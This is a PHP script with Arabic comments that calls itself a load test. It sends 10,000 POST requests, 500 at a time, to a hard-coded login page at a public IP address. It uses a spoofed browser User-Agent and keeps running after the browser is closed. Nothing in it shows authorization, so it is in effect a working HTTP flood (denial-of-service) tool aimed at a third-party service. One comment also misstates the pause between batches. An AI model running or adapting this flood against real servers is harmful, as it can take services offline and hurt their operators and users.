 <?php
// 1. إلغاء القيود الزمنية ومنع توقف السكربت عند إغلاق المتصفح
set_time_limit(0);
ignore_user_abort(true);

// ضبط ترويسة الصفحة لإظهار المخرجات فوراً ثانية بثانية دون تخزين مؤقت (Buffer)
header('Content-Type: text/html; charset=utf-8');
header('X-Accel-Encoding: none'); // لإيقاف التخزين المؤقت في سيرفرات Nginx
ob_end_clean();
echo str_repeat(' ', 1024); // حشو مبدئي لتفعيل التدفق المباشر في بعض المتصفحات

// 2. إعداد الرابط والبيانات بالصيغة الصحيحة المتوافقة
$target_url = "http://187.7.17.67/sudani/login2.php";
$payload = [
    'account_number' => '123456789',
    'password'       => 'test_password'
];

// 3. إعدادات كثافة الحمل والضغط
$concurrency_batch = 500;  // عدد الطلبات المتزامنة في الدفعة الواحدة (التوازي)
$total_batches     = 20;  // عدد الدفعات الإجمالية (التكرار المستمر)

echo "<h2>🔥 بدء اختبار الحمل المستمر والمكثف (Loop Batches + cURL Multi)</h2>";
echo "⚙️ الإعدادات: إرسال <b>{$concurrency_batch}</b> طلب متزامن على مدار <b>{$total_batches}</b> دفعة متتالية.<br>";
echo "---------------------------------------------------------------------------------<br><br>";
flush();

// 4. حلقة التكرار الأساسية للمجموعات (The Loop Batches)
for ($batch = 1; $batch <= $total_batches; $batch++) {
    
    echo "📦 <b>تشغيل الدفعة رقم [ {$batch} / {$total_batches} ]</b>... ";
    flush();
    
    // تهيئة المعالج المتعدد للطلب المتوازي
    $mh = curl_multi_init();
    $handles = [];

    // بناء القنوات المتوازية لهذه الدفعة
    for ($i = 0; $i < $concurrency_batch; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4); // وقت انتهاء ذكي لتجنب تعليق الدفعة
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type: application/x-www-form-urlencoded'
        ]);
        
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // تنفيـذ الدفعة وإطلاق كافة طلباتها معاً في نفس اللحظة
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh); 
    } while ($running > 0);

    // فحص الإحصائيات السريعة لهذه الدفعة
    $success_200 = 0;
    $other_codes = 0;

    foreach ($handles as $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 200) {
            $success_200++;
        } else {
            $other_codes++;
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    // طباعة النتيجة الفورية للدفعة الحالية قبل الانتقال للدفعة التالية
    echo "📊 النتيجة: (✅ استجابة 200: <b>{$success_200}</b> | ❌ أخرى/قيود: <b>{$other_codes}</b>)<br>";
    flush();

    // فاصل زمني ميكروي (اختياري) لمنع تجمد كرت الشبكة الخاص بالسيرفر السحابي الرافع للملف
    usleep(100000); // ربع ثانية (250 مللي ثانية) بين كل دفعة وأخرى لضمان استقرار تدفق البيانات
}

echo "<br>🏁 <b>انتهت جميع الدفعات المتتالية واكتمل اختبار الحمل الأقصى بنجاح.</b>";
flush();
?>
